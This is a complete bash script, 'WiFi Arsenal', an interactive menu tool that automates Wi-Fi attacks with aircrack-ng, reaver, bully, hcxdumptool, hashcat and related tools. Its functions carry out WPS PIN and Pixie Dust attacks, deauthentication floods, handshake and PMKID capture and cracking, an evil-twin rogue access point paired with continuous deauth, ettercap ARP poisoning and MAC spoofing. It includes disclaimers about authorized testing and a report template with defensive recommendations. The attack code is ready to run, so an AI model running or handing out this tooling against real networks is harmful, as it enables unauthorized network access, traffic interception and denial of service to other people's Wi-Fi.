#!/bin/bash

# WiFi Arsenal - Comprehensive WiFi Security Testing Tool
# Author: Ethical Hacker Tool
# Version: 2.0
# For Educational and Authorized Testing Only

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuration
INTERFACE=""
MONITOR_INTERFACE=""
WORDLIST_PATH="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="$(pwd)/wifi_arsenal_output"
SESSION_DIR="$OUTPUT_DIR/sessions"
LOG_FILE="$OUTPUT_DIR/wifi_arsenal.log"

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════╗
    ║                        WiFi Arsenal                          ║
    ║              Comprehensive WiFi Security Toolkit            ║
    ║                                                              ║
    ║  ⚠️  FOR AUTHORIZED TESTING AND EDUCATIONAL USE ONLY ⚠️   ║
    ╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${WHITE}Version: 2.0 | Author: Ethical Hacker Tool${NC}"
    echo -e "${YELLOW}Date: $(date)${NC}"
    echo ""
}

# Logging function
log_action() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    local deps=("aircrack-ng" "reaver" "hostapd" "dnsmasq" "ettercap-text-only" "nmap" "hcxdumptool" "hcxtools" "hashcat" "john" "macchanger" "wash" "bully")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Missing dependencies: ${missing[*]}${NC}"
        echo -e "${BLUE}[*] Install with: apt update && apt install -y ${missing[*]}${NC}"
        read -p "Continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    else
        echo -e "${GREEN}[✓] All dependencies found${NC}"
    fi
}

# Setup directories
setup_environment() {
    echo -e "${BLUE}[*] Setting up environment...${NC}"
    mkdir -p "$OUTPUT_DIR" "$SESSION_DIR"
    touch "$LOG_FILE"
    log_action "WiFi Arsenal started"
    echo -e "${GREEN}[✓] Environment ready${NC}"
}

# Get network interfaces
get_interfaces() {
    echo -e "${BLUE}[*] Available network interfaces:${NC}"
    local interfaces=($(ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | tr -d ' ' | grep -v lo))
    local count=1
    
    for iface in "${interfaces[@]}"; do
        local status=$(ip link show "$iface" | grep -o "state [A-Z]*" | cut -d' ' -f2)
        echo -e "${WHITE}[$count]${NC} $iface (${status})"
        ((count++))
    done
    
    read -p "Select interface number: " choice
    if [[ $choice -ge 1 && $choice -le ${#interfaces[@]} ]]; then
        INTERFACE="${interfaces[$((choice-1))]}"
        echo -e "${GREEN}[✓] Selected interface: $INTERFACE${NC}"
    else
        echo -e "${RED}[!] Invalid selection${NC}"
        exit 1
    fi
}

# Monitor mode functions
enable_monitor_mode() {
    echo -e "${BLUE}[*] Enabling monitor mode on $INTERFACE...${NC}"
    
    # Kill interfering processes
    airmon-ng check kill &>/dev/null
    
    # Enable monitor mode
    MONITOR_INTERFACE="${INTERFACE}mon"
    airmon-ng start "$INTERFACE" &>/dev/null
    
    # Verify monitor mode
    if iwconfig "$MONITOR_INTERFACE" &>/dev/null; then
        echo -e "${GREEN}[✓] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
        log_action "Monitor mode enabled on $MONITOR_INTERFACE"
    else
        echo -e "${RED}[!] Failed to enable monitor mode${NC}"
        exit 1
    fi
}

disable_monitor_mode() {
    if [[ -n "$MONITOR_INTERFACE" ]]; then
        echo -e "${BLUE}[*] Disabling monitor mode...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null
        systemctl restart NetworkManager &>/dev/null
        echo -e "${GREEN}[✓] Monitor mode disabled${NC}"
        log_action "Monitor mode disabled"
    fi
}

# WiFi scanning
wifi_scan() {
    echo -e "${BLUE}[*] Scanning for WiFi networks...${NC}"
    local scan_file="$OUTPUT_DIR/wifi_scan_$(date +%Y%m%d_%H%M%S)"
    
    timeout 30 airodump-ng "$MONITOR_INTERFACE" --write "$scan_file" --output-format csv &>/dev/null
    
    if [[ -f "${scan_file}-01.csv" ]]; then
        echo -e "${GREEN}[✓] Scan completed. Results saved to ${scan_file}-01.csv${NC}"
        echo -e "${BLUE}[*] Networks found:${NC}"
        
        # Parse and display results
        tail -n +2 "${scan_file}-01.csv" | head -n -1 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [[ -n "$bssid" && "$bssid" != "BSSID" ]]; then
                essid=$(echo "$essid" | tr -d ' ')
                privacy=$(echo "$privacy" | tr -d ' ')
                echo -e "${WHITE}ESSID:${NC} $essid ${WHITE}BSSID:${NC} $bssid ${WHITE}Channel:${NC} $channel ${WHITE}Security:${NC} $privacy"
            fi
        done
        
        log_action "WiFi scan completed: ${scan_file}-01.csv"
    else
        echo -e "${RED}[!] Scan failed${NC}"
    fi
}

# WPS attacks
wps_attack_menu() {
    echo -e "${CYAN}=== WPS Attack Menu ===${NC}"
    echo -e "${WHITE}[1]${NC} WPS PIN Attack (Reaver)"
    echo -e "${WHITE}[2]${NC} WPS Pixie Dust Attack"
    echo -e "${WHITE}[3]${NC} WPS Null PIN Attack"
    echo -e "${WHITE}[4]${NC} WPS Scan"
    echo -e "${WHITE}[5]${NC} Return to main menu"
    echo ""
    
    read -p "Select option: " wps_choice
    
    case $wps_choice in
        1) wps_reaver_attack ;;
        2) wps_pixie_attack ;;
        3) wps_null_pin_attack ;;
        4) wps_scan ;;
        5) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

wps_scan() {
    echo -e "${BLUE}[*] Scanning for WPS-enabled networks...${NC}"
    local output_file="$OUTPUT_DIR/wps_scan_$(date +%Y%m%d_%H%M%S).txt"
    
    timeout 30 wash -i "$MONITOR_INTERFACE" | tee "$output_file"
    echo -e "${GREEN}[✓] WPS scan results saved to $output_file${NC}"
    log_action "WPS scan completed: $output_file"
}

wps_reaver_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    
    echo -e "${BLUE}[*] Starting WPS PIN attack against $target_bssid...${NC}"
    local session_file="$SESSION_DIR/reaver_$target_bssid.session"
    
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$channel" -a -K -N -L -s "$session_file" -vv
    log_action "Reaver attack attempted on $target_bssid"
}

wps_pixie_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    
    echo -e "${BLUE}[*] Starting Pixie Dust attack against $target_bssid...${NC}"
    reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$channel" -K -N -L -vv
    log_action "Pixie Dust attack attempted on $target_bssid"
}

wps_null_pin_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    
    echo -e "${BLUE}[*] Starting Null PIN attack against $target_bssid...${NC}"
    bully "$MONITOR_INTERFACE" -b "$target_bssid" -c "$channel" -S -F -B -v 4
    log_action "Null PIN attack attempted on $target_bssid"
}

# WPA/WPA2 attacks
wpa_attack_menu() {
    echo -e "${CYAN}=== WPA/WPA2 Attack Menu ===${NC}"
    echo -e "${WHITE}[1]${NC} Capture Handshake"
    echo -e "${WHITE}[2]${NC} Deauth Attack"
    echo -e "${WHITE}[3]${NC} Dictionary Attack"
    echo -e "${WHITE}[4]${NC} PMKID Attack"
    echo -e "${WHITE}[5]${NC} Crack Captured Handshake"
    echo -e "${WHITE}[6]${NC} Return to main menu"
    echo ""
    
    read -p "Select option: " wpa_choice
    
    case $wpa_choice in
        1) capture_handshake ;;
        2) deauth_attack ;;
        3) dictionary_attack ;;
        4) pmkid_attack ;;
        5) crack_handshake ;;
        6) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

capture_handshake() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    read -p "Enter capture duration (seconds, default 60): " duration
    duration=${duration:-60}
    
    local capture_file="$OUTPUT_DIR/handshake_${target_bssid//:/_}_$(date +%Y%m%d_%H%M%S)"
    
    echo -e "${BLUE}[*] Capturing handshake for $target_bssid...${NC}"
    echo -e "${YELLOW}[*] Run deauth attack in another terminal if needed${NC}"
    
    timeout "$duration" airodump-ng "$MONITOR_INTERFACE" --bssid "$target_bssid" -c "$channel" -w "$capture_file"
    
    if [[ -f "${capture_file}-01.cap" ]]; then
        echo -e "${GREEN}[✓] Capture completed: ${capture_file}-01.cap${NC}"
        
        # Check for handshake
        if aircrack-ng "${capture_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "${GREEN}[✓] Handshake captured successfully!${NC}"
        else
            echo -e "${YELLOW}[!] No handshake detected in capture${NC}"
        fi
        
        log_action "Handshake capture attempted for $target_bssid: ${capture_file}-01.cap"
    fi
}

deauth_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter client MAC (or 'all' for broadcast): " client_mac
    read -p "Enter number of deauth packets (default 10): " packet_count
    packet_count=${packet_count:-10}
    
    if [[ "$client_mac" == "all" ]]; then
        echo -e "${BLUE}[*] Sending $packet_count deauth packets to all clients of $target_bssid...${NC}"
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" "$MONITOR_INTERFACE"
    else
        echo -e "${BLUE}[*] Sending $packet_count deauth packets to $client_mac via $target_bssid...${NC}"
        aireplay-ng --deauth "$packet_count" -a "$target_bssid" -c "$client_mac" "$MONITOR_INTERFACE"
    fi
    
    log_action "Deauth attack: $packet_count packets to $client_mac via $target_bssid"
}

pmkid_attack() {
    echo -e "${BLUE}[*] Starting PMKID attack...${NC}"
    local pmkid_file="$OUTPUT_DIR/pmkid_$(date +%Y%m%d_%H%M%S)"
    
    read -p "Enter attack duration in seconds (default 300): " duration
    duration=${duration:-300}
    
    timeout "$duration" hcxdumptool -i "$MONITOR_INTERFACE" -o "${pmkid_file}.pcapng" --enable_status=1
    
    if [[ -f "${pmkid_file}.pcapng" ]]; then
        # Convert to hashcat format
        hcxpcapngtool -o "${pmkid_file}.hc22000" "${pmkid_file}.pcapng"
        
        if [[ -f "${pmkid_file}.hc22000" ]]; then
            echo -e "${GREEN}[✓] PMKID capture completed: ${pmkid_file}.hc22000${NC}"
            echo -e "${BLUE}[*] Use hashcat with mode 22000 to crack${NC}"
            log_action "PMKID attack completed: ${pmkid_file}.hc22000"
        fi
    fi
}

dictionary_attack() {
    read -p "Enter path to capture file (.cap): " cap_file
    read -p "Enter wordlist path (default: $WORDLIST_PATH): " wordlist
    wordlist=${wordlist:-$WORDLIST_PATH}
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] Capture file not found${NC}"
        return
    fi
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found${NC}"
        return
    fi
    
    echo -e "${BLUE}[*] Starting dictionary attack...${NC}"
    aircrack-ng "$cap_file" -w "$wordlist"
    log_action "Dictionary attack on $cap_file with $wordlist"
}

crack_handshake() {
    echo -e "${BLUE}[*] Available capture files:${NC}"
    local cap_files=($(find "$OUTPUT_DIR" -name "*.cap" -o -name "*.hc22000" 2>/dev/null))
    
    if [[ ${#cap_files[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No capture files found${NC}"
        return
    fi
    
    local count=1
    for file in "${cap_files[@]}"; do
        echo -e "${WHITE}[$count]${NC} $(basename "$file")"
        ((count++))
    done
    
    read -p "Select file number: " file_choice
    if [[ $file_choice -ge 1 && $file_choice -le ${#cap_files[@]} ]]; then
        local selected_file="${cap_files[$((file_choice-1))]}"
        
        echo -e "${CYAN}=== Crack Method ===${NC}"
        echo -e "${WHITE}[1]${NC} Aircrack-ng (dictionary)"
        echo -e "${WHITE}[2]${NC} Hashcat (GPU)"
        echo -e "${WHITE}[3]${NC} John the Ripper"
        
        read -p "Select method: " crack_method
        
        case $crack_method in
            1) 
                read -p "Enter wordlist path: " wordlist
                aircrack-ng "$selected_file" -w "$wordlist"
                ;;
            2)
                if [[ "$selected_file" == *.hc22000 ]]; then
                    read -p "Enter wordlist path: " wordlist
                    hashcat -m 22000 "$selected_file" "$wordlist"
                else
                    echo -e "${YELLOW}[!] Convert to .hc22000 format first${NC}"
                fi
                ;;
            3)
                # Convert for John if needed
                local john_file="${selected_file%.*}.john"
                aircrack-ng "$selected_file" -J "$john_file" 2>/dev/null
                read -p "Enter wordlist path: " wordlist
                john --wordlist="$wordlist" "${john_file}.hccap"
                ;;
        esac
    fi
}

# Evil Twin attack
evil_twin_attack() {
    echo -e "${CYAN}=== Evil Twin Attack ===${NC}"
    read -p "Enter target ESSID: " target_essid
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter channel: " channel
    
    # Create hostapd config
    local hostapd_conf="$OUTPUT_DIR/hostapd_evil.conf"
    cat > "$hostapd_conf" << EOF
interface=$MONITOR_INTERFACE
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    
    # Create dnsmasq config
    local dnsmasq_conf="$OUTPUT_DIR/dnsmasq_evil.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$MONITOR_INTERFACE
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF
    
    echo -e "${BLUE}[*] Starting Evil Twin attack...${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
    
    # Start deauth against target
    aireplay-ng --deauth 0 -a "$target_bssid" "$MONITOR_INTERFACE" &
    DEAUTH_PID=$!
    
    # Configure interface
    ifconfig "$MONITOR_INTERFACE" 192.168.1.1
    
    # Start services
    dnsmasq -C "$dnsmasq_conf" &
    DNSMASQ_PID=$!
    
    hostapd "$hostapd_conf" &
    HOSTAPD_PID=$!
    
    # Cleanup function
    cleanup_evil_twin() {
        echo -e "\n${BLUE}[*] Cleaning up Evil Twin attack...${NC}"
        kill $DEAUTH_PID $DNSMASQ_PID $HOSTAPD_PID 2>/dev/null
        rm -f "$hostapd_conf" "$dnsmasq_conf"
    }
    
    trap cleanup_evil_twin SIGINT
    wait $HOSTAPD_PID
    
    log_action "Evil Twin attack against $target_essid ($target_bssid)"
}

# Network discovery
network_discovery() {
    echo -e "${BLUE}[*] Network Discovery Menu${NC}"
    echo -e "${WHITE}[1]${NC} ARP Scan"
    echo -e "${WHITE}[2]${NC} Nmap Scan"
    echo -e "${WHITE}[3]${NC} Ettercap Host Discovery"
    echo -e "${WHITE}[4]${NC} Return to main menu"
    
    read -p "Select option: " disc_choice
    
    case $disc_choice in
        1) arp_scan ;;
        2) nmap_scan ;;
        3) ettercap_discovery ;;
        4) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

arp_scan() {
    read -p "Enter network range (e.g., 192.168.1.0/24): " network
    echo -e "${BLUE}[*] Performing ARP scan on $network...${NC}"
    
    nmap -sn "$network" | grep -E "(Nmap scan report|MAC Address)" | tee "$OUTPUT_DIR/arp_scan_$(date +%Y%m%d_%H%M%S).txt"
    log_action "ARP scan performed on $network"
}

nmap_scan() {
    read -p "Enter target IP/range: " target
    echo -e "${BLUE}[*] Nmap scan options:${NC}"
    echo -e "${WHITE}[1]${NC} Quick scan (-T4 -F)"
    echo -e "${WHITE}[2]${NC} Comprehensive scan (-A -T4)"
    echo -e "${WHITE}[3]${NC} Stealth scan (-sS -T2)"
    echo -e "${WHITE}[4]${NC} Custom scan"
    
    read -p "Select scan type: " scan_type
    local nmap_opts=""
    
    case $scan_type in
        1) nmap_opts="-T4 -F" ;;
        2) nmap_opts="-A -T4" ;;
        3) nmap_opts="-sS -T2" ;;
        4) read -p "Enter custom nmap options: " nmap_opts ;;
    esac
    
    echo -e "${BLUE}[*] Running nmap $nmap_opts $target...${NC}"
    nmap $nmap_opts "$target" | tee "$OUTPUT_DIR/nmap_scan_$(date +%Y%m%d_%H%M%S).txt"
    log_action "Nmap scan: $nmap_opts $target"
}

ettercap_discovery() {
    echo -e "${BLUE}[*] Starting Ettercap host discovery...${NC}"
    echo -e "${YELLOW}[!] This will scan the local network${NC}"
    
    ettercap -T -M arp:remote ///  | tee "$OUTPUT_DIR/ettercap_discovery_$(date +%Y%m%d_%H%M%S).txt"
    log_action "Ettercap host discovery performed"
}

# MAC address operations
mac_operations() {
    echo -e "${CYAN}=== MAC Address Operations ===${NC}"
    echo -e "${WHITE}[1]${NC} Randomize MAC address"
    echo -e "${WHITE}[2]${NC} Set specific MAC address"
    echo -e "${WHITE}[3]${NC} Reset to original MAC"
    echo -e "${WHITE}[4]${NC} Show current MAC"
    echo -e "${WHITE}[5]${NC} Return to main menu"
    
    read -p "Select option: " mac_choice
    
    case $mac_choice in
        1) randomize_mac ;;
        2) set_mac ;;
        3) reset_mac ;;
        4) show_mac ;;
        5) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

randomize_mac() {
    echo -e "${BLUE}[*] Randomizing MAC address for $INTERFACE...${NC}"
    macchanger -r "$INTERFACE"
    log_action "MAC address randomized for $INTERFACE"
}

set_mac() {
    read -p "Enter new MAC address (XX:XX:XX:XX:XX:XX): " new_mac
    echo -e "${BLUE}[*] Setting MAC address to $new_mac...${NC}"
    macchanger -m "$new_mac" "$INTERFACE"
    log_action "MAC address set to $new_mac for $INTERFACE"
}

reset_mac() {
    echo -e "${BLUE}[*] Resetting MAC address to original...${NC}"
    macchanger -p "$INTERFACE"
    log_action "MAC address reset to original for $INTERFACE"
}

show_mac() {
    echo -e "${BLUE}[*] Current MAC address information:${NC}"
    macchanger -s "$INTERFACE"
}

# Session management
session_management() {
    echo -e "${CYAN}=== Session Management ===${NC}"
    echo -e "${WHITE}[1]${NC} List saved sessions"
    echo -e "${WHITE}[2]${NC} Load session"
    echo -e "${WHITE}[3]${NC} Delete session"
    echo -e "${WHITE}[4]${NC} Export session data"
    echo -e "${WHITE}[5]${NC} Return to main menu"
    
    read -p "Select option: " session_choice
    
    case $session_choice in
        1) list_sessions ;;
        2) load_session ;;
        3) delete_session ;;
        4) export_session ;;
        5) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

list_sessions() {
    echo -e "${BLUE}[*] Saved sessions:${NC}"
    if [[ -d "$SESSION_DIR" ]]; then
        find "$SESSION_DIR" -type f -name "*.session" -exec basename {} \; 2>/dev/null | sort
    else
        echo -e "${YELLOW}[!] No sessions found${NC}"
    fi
}

load_session() {
    echo -e "${BLUE}[*] Available sessions:${NC}"
    local sessions=($(find "$SESSION_DIR" -name "*.session" 2>/dev/null))
    
    if [[ ${#sessions[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No sessions found${NC}"
        return
    fi
    
    local count=1
    for session in "${sessions[@]}"; do
        echo -e "${WHITE}[$count]${NC} $(basename "$session")"
        ((count++))
    done
    
    read -p "Select session number: " choice
    if [[ $choice -ge 1 && $choice -le ${#sessions[@]} ]]; then
        local selected_session="${sessions[$((choice-1))]}"
        echo -e "${GREEN}[✓] Session loaded: $(basename "$selected_session")${NC}"
        cat "$selected_session"
    fi
}

# Reporting
generate_report() {
    local report_file="$OUTPUT_DIR/wifi_arsenal_report_$(date +%Y%m%d_%H%M%S).html"
    
    echo -e "${BLUE}[*] Generating HTML report...${NC}"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Arsenal Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .success { background-color: #d4edda; border-color: #c3e6cb; }
        .warning { background-color: #fff3cd; border-color: #ffeaa7; }
        .danger { background-color: #f8d7da; border-color: #f5c6cb; }
        pre { background-color: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1 class="header">WiFi Arsenal Security Assessment Report</h1>
    <p><strong>Generated:</strong> $(date)</p>
    <p><strong>Tool Version:</strong> WiFi Arsenal v2.0</p>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>This report contains the results of WiFi security testing performed using WiFi Arsenal toolkit.</p>
    </div>
    
    <div class="section">
        <h2>Scan Results</h2>
        <h3>WiFi Networks Discovered</h3>
        <pre>$(find "$OUTPUT_DIR" -name "*scan*.csv" -exec tail -n +2 {} \; 2>/dev/null | head -20)</pre>
    </div>
    
    <div class="section">
        <h2>Security Assessment</h2>
        <h3>WPS Enabled Networks</h3>
        <pre>$(find "$OUTPUT_DIR" -name "wps_scan*.txt" -exec cat {} \; 2>/dev/null)</pre>
    </div>
    
    <div class="section">
        <h2>Captured Data</h2>
        <h3>Handshakes and Captures</h3>
        <ul>
$(find "$OUTPUT_DIR" -name "*.cap" -o -name "*.hc22000" | while read -r file; do echo "            <li>$(basename "$file")</li>"; done)
        </ul>
    </div>
    
    <div class="section">
        <h2>Log Summary</h2>
        <pre>$(tail -50 "$LOG_FILE" 2>/dev/null)</pre>
    </div>
    
    <div class="section warning">
        <h2>Recommendations</h2>
        <ul>
            <li>Disable WPS on all wireless access points</li>
            <li>Use strong WPA3 encryption where possible</li>
            <li>Implement strong, unique passphrases (>15 characters)</li>
            <li>Enable MAC address filtering for critical networks</li>
            <li>Regular security audits and monitoring</li>
        </ul>
    </div>
    
    <div class="section danger">
        <h2>Disclaimer</h2>
        <p><strong>IMPORTANT:</strong> This tool is for authorized security testing only. Unauthorized access to networks is illegal and unethical.</p>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
    log_action "HTML report generated: $report_file"
}

# Cleanup function
cleanup() {
    echo -e "\n${BLUE}[*] Cleaning up...${NC}"
    disable_monitor_mode
    
    # Kill background processes
    killall hostapd dnsmasq 2>/dev/null
    
    echo -e "${GREEN}[✓] Cleanup completed${NC}"
    log_action "WiFi Arsenal session ended"
    exit 0
}

# Main menu
main_menu() {
    while true; do
        print_banner
        echo -e "${CYAN}=== Main Menu ===${NC}"
        echo -e "${WHITE}[1]${NC}  WiFi Network Scanning"
        echo -e "${WHITE}[2]${NC}  WPS Attacks"
        echo -e "${WHITE}[3]${NC}  WPA/WPA2 Attacks" 
        echo -e "${WHITE}[4]${NC}  Evil Twin Attack"
        echo -e "${WHITE}[5]${NC}  Network Discovery"
        echo -e "${WHITE}[6]${NC}  MAC Address Operations"
        echo -e "${WHITE}[7]${NC}  Session Management"
        echo -e "${WHITE}[8]${NC}  Generate Report"
        echo -e "${WHITE}[9]${NC}  View Logs"
        echo -e "${WHITE}[10]${NC} Configuration"
        echo -e "${WHITE}[11]${NC} Exit"
        echo ""
        
        read -p "Select option: " choice
        
        case $choice in
            1) wifi_scan ;;
            2) wps_attack_menu ;;
            3) wpa_attack_menu ;;
            4) evil_twin_attack ;;
            5) network_discovery ;;
            6) mac_operations ;;
            7) session_management ;;
            8) generate_report ;;
            9) tail -f "$LOG_FILE" ;;
            10) configuration_menu ;;
            11) cleanup ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        
        if [[ $choice != 9 ]]; then
            echo ""
            read -p "Press Enter to continue..."
        fi
    done
}

# Configuration menu
configuration_menu() {
    echo -e "${CYAN}=== Configuration ===${NC}"
    echo -e "${WHITE}[1]${NC} Change wordlist path"
    echo -e "${WHITE}[2]${NC} Change output directory"
    echo -e "${WHITE}[3]${NC} Reset to defaults"
    echo -e "${WHITE}[4]${NC} Show current settings"
    echo -e "${WHITE}[5]${NC} Return to main menu"
    
    read -p "Select option: " config_choice
    
    case $config_choice in
        1) 
            read -p "Enter new wordlist path: " new_wordlist
            if [[ -f "$new_wordlist" ]]; then
                WORDLIST_PATH="$new_wordlist"
                echo -e "${GREEN}[✓] Wordlist path updated${NC}"
            else
                echo -e "${RED}[!] File not found${NC}"
            fi
            ;;
        2)
            read -p "Enter new output directory: " new_output
            OUTPUT_DIR="$new_output"
            SESSION_DIR="$OUTPUT_DIR/sessions"
            LOG_FILE="$OUTPUT_DIR/wifi_arsenal.log"
            setup_environment
            echo -e "${GREEN}[✓] Output directory updated${NC}"
            ;;
        3)
            WORDLIST_PATH="/usr/share/wordlists/rockyou.txt"
            OUTPUT_DIR="$(pwd)/wifi_arsenal_output"
            SESSION_DIR="$OUTPUT_DIR/sessions"
            LOG_FILE="$OUTPUT_DIR/wifi_arsenal.log"
            echo -e "${GREEN}[✓] Settings reset to defaults${NC}"
            ;;
        4)
            echo -e "${BLUE}Current Settings:${NC}"
            echo -e "Interface: $INTERFACE"
            echo -e "Monitor Interface: $MONITOR_INTERFACE"
            echo -e "Wordlist: $WORDLIST_PATH"
            echo -e "Output Directory: $OUTPUT_DIR"
            echo -e "Log File: $LOG_FILE"
            ;;
        5) return ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

# Main execution
main() {
    # Set trap for cleanup
    trap cleanup SIGINT SIGTERM
    
    # Initial checks
    check_root
    check_dependencies
    setup_environment
    
    # Get interface and enable monitor mode
    get_interfaces
    enable_monitor_mode
    
    # Start main menu
    main_menu
}

# Run main function
main "$@"
